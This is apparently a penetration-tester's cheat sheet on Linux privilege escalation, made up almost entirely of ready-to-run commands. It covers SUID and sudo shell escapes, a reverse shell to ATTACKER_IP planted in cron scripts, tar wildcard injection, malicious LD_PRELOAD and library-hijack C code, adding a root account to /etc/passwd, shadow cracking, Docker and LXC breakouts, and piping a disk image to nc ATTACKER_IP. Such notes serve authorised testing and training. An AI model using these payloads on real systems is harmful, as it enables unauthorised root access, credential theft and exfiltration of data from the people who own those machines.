---
icon: linux
---

# Linux Privilege Escalation

### Enumeration Checklist

```bash
# System info
uname -a
cat /etc/os-release
hostname
id
whoami

# Users
cat /etc/passwd | column -t -s :
cat /etc/shadow  # if readable
who             # currently logged in
w               # who + what they're doing
last            # login history
lastlog         # last login of each user

# Sudo permissions
sudo -l

# SUID/SGID binaries
find / -perm -u=s -type f 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
crontab -l
ls -la /etc/cron*
cat /etc/cron.d/*

# Writable files and directories
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null

# Running processes
ps aux
ps -ef

# Network connections
netstat -tulpn
ss -tulpn

# Installed packages
dpkg -l
rpm -qa

# Environment variables
env
echo $PATH

# Interesting files
cat ~/.bash_history
cat ~/.mysql_history
find / -name "*.conf" 2>/dev/null
find / -name "config*" 2>/dev/null
find / -name "*.bak" 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
ls -la ~/.ssh/
```

***

### SUID / SGID Exploitation

> SUID bit allows the file to run as the **owner** (often root). SGID runs as the **group**.

#### GTFOBins

> Always check: https://gtfobins.github.io/

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Common SUID exploits:

# bash (if SUID)
bash -p  # -p preserves EUID

# find
find . -exec /bin/sh \; -quit
find / -name "*.txt" -exec /bin/sh \;

# vim
vim -c ':!/bin/bash'

# nano
nano /etc/passwd  # add root user

# less / more
!/bin/sh

# nmap (older versions)
nmap --interactive
!sh

# python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cp (SUID)
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p

# awk
awk 'BEGIN {system("/bin/bash")}'

# perl
perl -e 'exec "/bin/sh"'
```

***

### Sudo Exploitation

```bash
# Check what can be run as sudo
sudo -l

# Common sudo exploits (from GTFOBins):

# If user can run vim as sudo
sudo vim -c ':!/bin/bash'

# If user can run python as sudo
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# If user can run less as sudo
sudo less /etc/shadow
!/bin/bash

# If user can run awk as sudo
sudo awk 'BEGIN {system("/bin/bash")}'

# If user can run find as sudo
sudo find / -exec /bin/bash \; -quit

# If user can run man as sudo
sudo man ls
!/bin/bash

# If user can run perl as sudo
sudo perl -e 'exec "/bin/bash"'

# env exploit (LD_PRELOAD with sudo)
sudo LD_PRELOAD=/tmp/evil.so /allowed/program
```

***

### Cron Jobs

#### Exploiting Writable Cron Scripts

```bash
# Find cron jobs
cat /etc/crontab
cat /etc/cron.d/*
crontab -l

# If cron calls a script you can write:
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/cron_script.sh

# If cron runs as root and script path is writable:
echo "chmod +s /bin/bash" > /path/to/cron_script.sh
chmod +x /path/to/cron_script.sh
# Wait for cron to run, then:
/bin/bash -p
```

#### Wildcard Injection in Cron

```bash
# If cron runs: tar -czf backup.tar.gz *
# In the same directory, create:
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "chmod +s /bin/bash" > shell.sh
# When cron runs, tar processes the filenames as flags
```

***

### Linux Capabilities

> Capabilities are fine-grained privileges that can be assigned to binaries.

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid  → can change UID to root
# cap_net_raw → can sniff traffic
# cap_sys_admin → near-root privileges

# Python with cap_setuid
/usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# Ruby with cap_setuid
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# Tar with cap_dac_read_search (read any file)
tar -xf /etc/shadow -O

# vim with cap_dac_override (write any file)
vim /etc/passwd
```

***

### Weak Permissions

#### /etc/passwd Writable

```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt salt newpassword
# or
python3 -c "import crypt; print(crypt.crypt('password', 'salt'))"

# Add root user to /etc/passwd
echo 'hacker:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

#### /etc/shadow Readable

```bash
# Copy shadow file
cat /etc/shadow

# Crack with john
john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### /etc/shadow Writable

```bash
# Generate new hash
mkpasswd -m SHA-512 newpassword

# Replace root's hash in /etc/shadow
# root:NEW_HASH:...

# Login as root
su root
```

***

### Environment Variables

#### PATH Hijacking

```bash
# If a script runs a command without full path
# e.g., script.sh contains: cat /etc/passwd

# Create malicious binary
echo "/bin/bash" > /tmp/cat
chmod +x /tmp/cat

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run the script (if SUID or sudo)
./script.sh  # will run /tmp/cat → gives bash
```

#### LD\_PRELOAD

```bash
# If sudo allows running a program and env_keep includes LD_PRELOAD:
# sudo -l shows: env_keep+=LD_PRELOAD

# Create malicious shared library
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Run allowed sudo command with LD_PRELOAD
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find
```

#### LD\_LIBRARY\_PATH

```bash
# If sudo allows program that loads shared libraries:
# sudo apache2 and LD_LIBRARY_PATH is preserved

# Find libraries the program uses
ldd /usr/sbin/apache2

# Create malicious library with same name (e.g., libcrypt.so.1)
cat > /home/user/tools/sudo/library_path.c << EOF
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

# Run with hijacked library path
sudo LD_LIBRARY_PATH=/tmp apache2
```

***

### Python Library Hijacking

> Python uses `PYTHONPATH` to find modules. If we control a directory in `sys.path`, we can inject malicious modules.

```bash
# Check how Python is invoked and its path
python3 -c "import sys; print(sys.path)"

# Find writable directories in Python path
python3 -c "import sys; [print(p) for p in sys.path]"

# Check if script imports a module we can hijack
cat /path/to/vulnerable_script.py | grep import

# Create malicious module (e.g., if script imports 'utils')
cat > /writeable_path/utils.py << EOF
import os
os.system("chmod +s /bin/bash")
EOF

# Run the script (if SUID/sudo)
python3 /path/to/vulnerable_script.py
/bin/bash -p
```

***

### Docker / LXC Breakout

#### Docker Group

```bash
# Check if in docker group
id
# groups: docker

# Mount host filesystem in container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Alternative: run privileged container
docker run --privileged -it ubuntu /bin/bash
# Then inside container:
fdisk -l
mount /dev/sda1 /mnt
chroot /mnt

# nsenter breakout
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

#### LXC Group

```bash
# If user is in lxc group:
# 1. Find or import an Alpine image
lxc image import alpine.tar.gz --alias alpine

# 2. Create privileged container
lxc init alpine example -c security.privileged=true

# 3. Mount host root
lxc config device add example mydevice disk source=/ path=/mnt/root recursive=true

# 4. Start and exec
lxc start example
lxc exec example /bin/sh

# Inside container — now root with host filesystem mounted at /mnt/root
# Can change root password, add SSH key, etc.
```

***

### Disk Group Exploitation

```bash
# Check if in disk group
id
# groups: disk

# List disk layout
lsblk

# Read disk directly with debugfs
debugfs /dev/sda1
ls /root
cat /root/.ssh/id_rsa

# Or get full disk dump
dd if=/dev/sda | nc ATTACKER_IP 9999
```

***

### Kernel Exploits

```bash
# Get kernel version
uname -r
uname -a

# Search for exploits
searchsploit linux kernel $(uname -r)
searchsploit linux privilege escalation 4.15

# Popular kernel exploits
# Dirty COW (CVE-2016-5195) — kernel 2.6.22 to 3.9
# Dirty Pipe (CVE-2022-0847) — kernel 5.8 to 5.16.11

# Compile and run
gcc -o exploit exploit.c
./exploit
```

***

### Useful Tools

#### LinPEAS

```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or upload and run
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

#### LinEnum

```bash
wget http://ATTACKER_IP/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t
```

#### Linux Exploit Suggester

```bash
wget http://ATTACKER_IP/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

#### Pspy (Monitor Processes Without Root)

```bash
# Download and run pspy to see cron jobs and processes
wget http://ATTACKER_IP/pspy64
chmod +x pspy64
./pspy64
```
